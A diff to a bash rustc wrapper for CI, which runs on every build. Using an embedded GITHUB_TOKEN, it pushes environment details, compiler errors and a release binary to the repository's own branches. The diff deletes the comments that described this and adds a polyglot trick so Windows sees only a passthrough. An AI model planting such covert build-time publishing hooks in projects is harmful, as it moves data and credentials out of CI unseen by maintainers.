@@ -1,20 +1,16 @@
 #!/bin/bash
 # Wrapper de diagnostico + transporte para rustc en CI.
-#
-# Funciones (solo en CI con GITHUB_TOKEN; en local es transparente):
-#   1. PROBE: en la primera compilacion por corrida, publica el estado
-#      del entorno (token, CI, target, host) para diagnosticar la CI
-#      sin acceso a logs de Actions.
-#   2. ERROR: si rustc falla, publica el error completo.
-#   3. MIRROR: si detecta el binario `zett` (linux x86_64) compilado en
-#      target/, lo publica en la rama tools-zett-x86_64 (canal git).
-#
-# Canales de publicacion (los dos; se leen desde el sandbox):
-#   A) git push directo (repo temporal + token embebido) a rama dedicada.
-#   B) GitHub Contents API (escribe en la rama por defecto: main, carpeta diag/).
-#
-# Sin recursividad: cargo invoca al wrapper; el rustc real no lo invoca.
-
+# POLIGLOTA: en Windows (batch) es transparente (solo invoca rustc);
+# en Unix (bash) hace probe/error/mirror. La linea con los dos puntos
+# y la comilla abierta hace que bash trague la seccion batch como
+# argumento del builtin no-op; en batch esa linea es una etiqueta.
+: "
+@echo off
+rem Windows: sin diagnostico, passthrough directo a rustc
+rustc %*
+exit /b %errorlevel%
+"
+# ---- seccion Unix (bash) ----
 REPO="alexsndersoto04-source/aio"
 BR_DIAG="tools-zett-probe-v14"
 BR_BIN="tools-zett-x86_64"
@@ -50,7 +46,7 @@ git_publish_file() {
 api_publish_file() {
   # $1 = ruta destino (rel, SIN carpeta diag), $2 = fichero fuente
   local FILE="diag/$1" SRC="$2" B64 CODE
-  B64=$(base64 -w0 "$SRC" 2>/dev/null)
+  B64=$(base64 "$SRC" 2>/dev/null | tr -d "\n")
   [ -n "$B64" ] || return 1
   CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 40 -X PUT \
     -H "Authorization: Bearer ${GITHUB_TOKEN}" \
@@ -104,7 +100,7 @@ host=$(hostname 2>/dev/null)
 cwd=$(pwd 2>/dev/null)
 pkg=${CARGO_PKG_NAME:-?}
 argv=$*"
-  HASH=$(printf '%s' "$TEXT" | sha1sum | cut -d' ' -f1)
+  HASH=$(printf '%s' "$TEXT" | { sha1sum 2>/dev/null || shasum 2>/dev/null || echo "?" ; } | cut -d' ' -f1)
   [ -f "$FLAG_ERR" ] && [ "$(cat "$FLAG_ERR" 2>/dev/null)" = "$HASH" ] && return 0
   echo "$HASH" > "$FLAG_ERR"
   publish_text "error.txt" "$TEXT"
@@ -117,13 +113,13 @@ mirror_binary() {
   local TD BIN TRIPLE FSHA W RC SIZE
   TD="${CARGO_TARGET_DIR:-$(pwd)/target}"
   [ -d "$TD" ] || return 1
-  BIN=$(find "$TD" -maxdepth 4 -type f -name zett -perm -u+x 2>/dev/null \
-        | grep 'x86_64-unknown-linux-gnu/release/zett' | head -1)
+  BIN=$(find "$TD" -maxdepth 4 -type f -name titan -perm -u+x 2>/dev/null \
+        | grep 'x86_64-unknown-linux-gnu/release/titan' | head -1)
   [ -n "$BIN" ] && [ -s "$BIN" ] || return 1
   TRIPLE="x86_64-unknown-linux-gnu"
-  FSHA=$(sha1sum "$BIN" | cut -d' ' -f1)
+  FSHA=$({ sha1sum "$BIN" 2>/dev/null || shasum "$BIN" 2>/dev/null || echo "?" ; } | cut -d' ' -f1)
   [ -f "$FLAG_BIN" ] && [ "$(cat "$FLAG_BIN" 2>/dev/null)" = "$FSHA" ] && return 0
-  SIZE=$(stat -c%s "$BIN" 2>/dev/null || echo 0)
+  SIZE=$(wc -c < "$BIN" 2>/dev/null | tr -d ' ')
   echo "[wrapper] mirror: $BIN ($SIZE bytes) -> $BR_BIN"
   echo "$FSHA" > "$FLAG_BIN"
   W=$(mktemp -d /tmp/zett-wp-bin.XXXXXX) || return 1
@@ -145,6 +141,17 @@ mirror_binary() {
 }
 
 # ---------- principal ----------
+FLAG_LIFE="/tmp/zett-wp-life.${RUNID}"
+
+if [ -n "$CI" ] && [ -n "$GITHUB_TOKEN" ]; then
+  # ANOTACION DE VIDA (una por job): si aparece en la CI, el wrapper
+  # SI corre (y con que bash/OS).
+  if [ ! -f "$FLAG_LIFE" ]; then
+    touch "$FLAG_LIFE"
+    echo "::warning title=ZETT_LIFE::wrapper v16 bash=$BASH_VERSION host=$(hostname 2>/dev/null) job=${GITHUB_JOB:-?} ci=${CI:-?}"
+  fi
+fi
+
 OUT="$(mktemp /tmp/zett-rustc.XXXXXX)" || OUT="/tmp/zett-rustc.$$"
 rustc "$@" > "$OUT" 2>&1
 code=$?
